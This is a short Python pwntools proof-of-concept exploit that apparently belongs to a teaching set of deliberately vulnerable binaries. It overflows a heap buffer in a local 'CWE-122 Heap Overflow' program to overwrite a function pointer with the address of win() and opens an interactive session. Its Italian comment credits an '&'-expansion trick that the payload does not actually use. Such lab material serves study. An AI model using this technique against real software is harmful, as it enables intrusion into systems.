"""
@file CWE-122 Heap Overflow Function Pointer Exploit.py
@brief Exploit PoC per CWE-122
Target: CWE-122 Heap Overflow

Descrizione:
Sfrutta l'espansione della stringa "&" -> "&amp;" per causare un overflow
nel buffer allocato sull'heap, sovrascrivendo il puntatore a funzione adiacente
`func_ptr` con l'indirizzo di `win()`.
"""

# Exploit for vuln4: Heap Overflow Overwriting Function Pointer
from pwn import *
import os

binary_path = os.path.abspath('../build/CWE-122 Heap Overflow')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln4 (Heap FP Overwrite)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")


payload = b'A' * 32 + p64(win_addr)

p = process(binary_path)
p.recvuntil(b"Enter input string: ")
p.send(payload)


p.interactive()


